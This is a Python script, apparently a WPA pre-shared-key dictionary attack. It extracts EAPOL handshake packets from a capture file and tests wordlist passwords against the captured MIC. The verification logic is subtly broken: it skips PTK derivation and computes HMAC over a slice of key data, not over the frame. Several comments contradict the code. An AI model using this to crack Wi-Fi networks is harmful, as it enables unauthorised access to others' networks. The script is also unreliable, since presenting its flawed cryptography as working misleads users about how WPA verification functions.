import pyshark
import hashlib
import hmac
import struct

# Extract the necessary handshake packets (EAPOL 2 and EAPOL 3)
def extract_handshake(file_path):
    capture = pyshark.FileCapture(file_path, display_filter="eapol")

    eapol_packets = []
    for packet in capture:
        if 'eapol' in packet:
            eapol_packets.append(packet)

    if len(eapol_packets) < 2:
        raise ValueError("Insufficient EAPOL packets (at least two required).")
    return eapol_packets[-2], eapol_packets[-1]  # EAPOL 2 and EAPOL 3

# Derive the PMK using PBKDF2-HMAC-SHA1 based on Aircrack-ng's method
def derive_pmk(password, ssid, ap_mac, client_mac):
    # Prepare the inputs for PBKDF2-HMAC-SHA1
    ssid_bytes = ssid.encode('utf-8')
    password_bytes = password.encode('utf-8')

    # Use PBKDF2-HMAC-SHA1 to derive the PMK
    pmk = hashlib.pbkdf2_hmac('sha1', password_bytes, ssid_bytes, 4096, dklen=32)
    return pmk

# Extract the MIC (Message Integrity Code) from the EAPOL packet
def get_mic_from_eapol(eapol_packet):
    try:
        key_mic = eapol_packet.eapol.key_mic
        return bytes.fromhex(key_mic)
    except AttributeError:
        raise ValueError("MIC not found in the packet.")

# Compute the MIC from the derived PMK and verify it
def verify_mic(pmk, eapol_3):
    key_mic = get_mic_from_eapol(eapol_3)

    # Extract the data from EAPOL 3
    key_data = eapol_3.eapol.key_data
    key_nonce = bytes.fromhex(key_data[8:24])

    # Aircrack-ng's verification logic using HMAC-SHA1
    mic_check = hmac.new(pmk, key_nonce, hashlib.sha1).digest()

    # Compare the MIC from EAPOL packet with the one generated from PMK
    return mic_check[:16] == key_mic  # First 16 bytes of the derived MIC should match the key MIC

# WPA PSK recovery function
def crack_psk(capture_file, ssid, wordlist):
    eapol_2, eapol_3 = extract_handshake(capture_file)

    ap_mac = eapol_2.wlan.ta  # Extract AP MAC address from EAPOL 2
    client_mac = eapol_2.wlan.sa  # Extract client MAC address from EAPOL 3

    # Loop through the wordlist and try each password
    for password in wordlist:
        print(f"Trying password: {password}")
        
        # Derive the PMK from the password, SSID, and MAC addresses
        pmk = derive_pmk(password, ssid, ap_mac, client_mac)

        # Verify if the derived PMK matches the MIC in EAPOL 3
        if verify_mic(pmk, eapol_3):
            print(f"Password found: {password}")
            return password

    print("Password not found in wordlist.")
    return None

if __name__ == "__main__":
    capture_file = "wpa.cap"
    ssid = "test"
    
    # Load wordlist from file or define a small list for testing
    wordlist = ["password1", "biscotte", "letmein"]  # Example wordlist; load from a file in practice
    
    found_password = crack_psk(capture_file, ssid, wordlist)

    if found_password:
        print(f"PSK (Password) found: {found_password}")
    else:
        print("No matching PSK found.")
